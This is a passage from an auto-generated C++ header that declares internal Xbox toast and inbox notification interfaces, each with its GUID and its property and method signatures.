                    MIDL_INTERFACE("7EED3F65-2E49-43F3-AE28-48F1F3152313")
                    IActiveToastChangedHandler : public IUnknown
                    {
                    public:
                        virtual HRESULT STDMETHODCALLTYPE Invoke(
                            /* [in] */Windows::Xbox::UI::Internal::ToastNotifications::IToast * newToast
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IActiveToastChangedHandler=_uuidof(IActiveToastChangedHandler);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Delegate Windows.Xbox.UI.Internal.ToastNotifications.ToastActionHandler
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler_INTERFACE_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("6D7E8B4D-6FB3-483A-9496-55D274ED07F8"), contract] */
                    MIDL_INTERFACE("6D7E8B4D-6FB3-483A-9496-55D274ED07F8")
                    IToastActionHandler : public IUnknown
                    {
                    public:
                        virtual HRESULT STDMETHODCALLTYPE Invoke(
                            /* [in] */Windows::Xbox::Input::IController * invokingDevice,
                            /* [in] */Windows::System::IUser * invokingUser,
                            /* [in] */__FIMapView_2_HSTRING_HSTRING * inputs
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IToastActionHandler=_uuidof(IToastActionHandler);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Delegate Windows.Xbox.UI.Internal.ToastNotifications.ToastExpiredHandler
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler_INTERFACE_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("0C6A7532-F50F-49C6-A968-2E80987A911C"), contract] */
                    MIDL_INTERFACE("0C6A7532-F50F-49C6-A968-2E80987A911C")
                    IToastExpiredHandler : public IUnknown
                    {
                    public:
                        virtual HRESULT STDMETHODCALLTYPE Invoke(
                            /* [in] */UINT32 userId,
                            /* [in] */UINT32 notificationID
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IToastExpiredHandler=_uuidof(IToastExpiredHandler);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IEditQuickRow
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Any object which implements this interface must also implement the following interfaces:
 *     Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IEditQuickRow[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IEditQuickRow";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("A542F553-4828-4C53-ACC7-9735D8785841"), contract] */
                    MIDL_INTERFACE("A542F553-4828-4C53-ACC7-9735D8785841")
                    IEditQuickRow : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Title(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_PlaceHolderContent(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_DefaultInput(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IEditQuickRow=_uuidof(IEditQuickRow);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IInboxAction
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IInboxAction[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IInboxAction";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("16392156-0A71-4CBB-B82E-3D196CDFDB16"), contract] */
                    MIDL_INTERFACE("16392156-0A71-4CBB-B82E-3D196CDFDB16")
                    IInboxAction : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Actor(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::IInboxActor * * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_ActionId(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_ActionTime(
                            /* [retval, out] */Windows::Foundation::DateTime * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_LaunchInfo(
                            /* [retval, out] */__FIMapView_2_HSTRING_HSTRING * * value
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IInboxAction=_uuidof(IInboxAction);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IInboxActor
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IInboxActor[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IInboxActor";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("BA54B3FF-9F77-46C2-9FF2-549E352BCE96"), contract] */
                    MIDL_INTERFACE("BA54B3FF-9F77-46C2-9FF2-549E352BCE96")
                    IInboxActor : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Id(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Name(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_UniqueModernGamertag(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Type(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::InboxActorType * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Pfn(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Image(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IInboxActor=_uuidof(IInboxActor);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IInboxGameType
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IInboxGameType[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IInboxGameType";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("DF8DF69A-F747-4AD7-A044-16DB4613DC0A"), contract] */
                    MIDL_INTERFACE("DF8DF69A-F747-4AD7-A044-16DB4613DC0A")
                    IInboxGameType : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Pfn(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_TitleId(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IInboxGameType=_uuidof(IInboxGameType);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IInboxManager
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Interface is a part of the implementation of type Windows.Xbox.UI.Internal.ToastNotifications.InboxManager
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IInboxManager[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IInboxManager";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("CCA4A2FA-6C2E-4BCC-B475-46B18AA067EC"), exclusiveto, contract] */
                    MIDL_INTERFACE("CCA4A2FA-6C2E-4BCC-B475-46B18AA067EC")
                    IInboxManager : public IInspectable
                    {
                    public:
                        virtual HRESULT STDMETHODCALLTYPE ReadNotificationAsync(
                            /* [in] */HSTRING userXuid,
                            /* [in] */HSTRING key,
                            /* [retval, out] */__FIAsyncOperation_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification * * operation
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE ReadNotificationsAsync(
                            /* [in] */HSTRING userXuid,
                            /* [retval, out] */__FIAsyncOperation_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification * * operation
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE FireToast(
                            /* [in] */Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification * notification
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE DeserializeNotification(
                            /* [in] */HSTRING payload,
                            /* [in] */HSTRING userXuid,
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification * * notification
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE ActivateNotificationAction(
                            /* [in] */Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification * notification
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IInboxManager=_uuidof(IInboxManager);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotification
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IInboxNotification[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotification";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("25BAA4AD-2B7A-4731-9D12-5FAC7EE0211D"), contract] */
                    MIDL_INTERFACE("25BAA4AD-2B7A-4731-9D12-5FAC7EE0211D")
                    IInboxNotification : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Category(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::InboxCategory * value
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE UpdateCategory(
                            /* [in] */HSTRING rawCategory
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_RawCategory(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Type(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::InboxType * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Id(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Text(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propput] */virtual HRESULT STDMETHODCALLTYPE put_Text(
                            /* [in] */HSTRING value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Seen(
                            /* [retval, out] */::boolean * value
                            ) = 0;
                        /* [propput] */virtual HRESULT STDMETHODCALLTYPE put_Seen(
                            /* [in] */::boolean value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_MarkedRead(
                            /* [retval, out] */::boolean * value
                            ) = 0;
                        /* [propput] */virtual HRESULT STDMETHODCALLTYPE put_MarkedRead(
                            /* [in] */::boolean value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Image(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_ImageType(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::InboxImageType * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_NotificationOptions(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotificationOptions * * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Actions(
                            /* [retval, out] */__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction * * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_OtherActionCount(
                            /* [retval, out] */UINT32 * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_TotalActionCount(
                            /* [retval, out] */UINT32 * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_RecipientXuid(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propput] */virtual HRESULT STDMETHODCALLTYPE put_RecipientXuid(
                            /* [in] */HSTRING value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_LaunchInfo(
                            /* [retval, out] */__FIMapView_2_HSTRING_HSTRING * * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Action(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction * * value
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IInboxNotification=_uuidof(IInboxNotification);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotificationOptions
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IInboxNotificationOptions[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotificationOptions";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("81DD2891-04A2-43ED-BC7F-52984AC197E1"), contract] */
                    MIDL_INTERFACE("81DD2891-04A2-43ED-BC7F-52984AC197E1")
                    IInboxNotificationOptions : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_LaunchInfo(
                            /* [retval, out] */__FIMapView_2_HSTRING_HSTRING * * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_LocalizationInfo(
                            /* [retval, out] */__FIMapView_2_HSTRING_HSTRING * * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Location(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::IInboxActor * * value
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IInboxNotificationOptions=_uuidof(IInboxNotificationOptions);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IPickerOption
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IPickerOption[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IPickerOption";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("0F1D27C1-313A-47AA-9F0C-A08C2828AB04"), contract] */
                    MIDL_INTERFACE("0F1D27C1-313A-47AA-9F0C-A08C2828AB04")
                    IPickerOption : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Id(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Content(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IPickerOption=_uuidof(IPickerOption);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IPickerQuickRow
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Any object which implements this interface must also implement the following interfaces:
 *     Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IPickerQuickRow[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IPickerQuickRow";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("C9C4E4FB-1147-46C9-BE82-2A95DA0AFB55"), contract] */
                    MIDL_INTERFACE("C9C4E4FB-1147-46C9-BE82-2A95DA0AFB55")
                    IPickerQuickRow : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Title(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_DefaultInput(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Options(
                            /* [retval, out] */__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption * * value
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IPickerQuickRow=_uuidof(IPickerQuickRow);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IToast
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IToast[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IToast";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("9533078B-4846-4F42-B4B1-D689D2AFFA23"), contract] */
                    MIDL_INTERFACE("9533078B-4846-4F42-B4B1-D689D2AFFA23")
                    IToast : public IInspectable
                    {
                    public:
                        virtual HRESULT STDMETHODCALLTYPE ActivateToastAction(
                            /* [in] */HSTRING invokedActionId,
                            /* [in] */Windows::Xbox::Input::IController * invokingDevice,
                            /* [in] */Windows::System::IUser * invokingUser,
                            /* [in] */__FIMapView_2_HSTRING_HSTRING * inputs
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE ReportToastDecayed(void) = 0;
                        virtual HRESULT STDMETHODCALLTYPE ReportToastDismissed(void) = 0;
                        virtual HRESULT STDMETHODCALLTYPE ReportToastDisabled(void) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_NotificationID(
                            /* [retval, out] */UINT32 * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_ToastType(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::ToastNotificationType * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Line1(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Line2(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Line3(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_AttributionText(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_AppLogoOverrideImage(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::IToastImage * * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_HeroImage(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::IToastImage * * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_InlineImages(
                            /* [retval, out] */__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage * * inlineImageUriList
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_AppSmallIconUri(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_AppBackgroundColor(
                            /* [retval, out] */UINT32 * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_UserColor1(
                            /* [retval, out] */UINT32 * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_UserColor2(
                            /* [retval, out] */UINT32 * value
                            ) = 0;
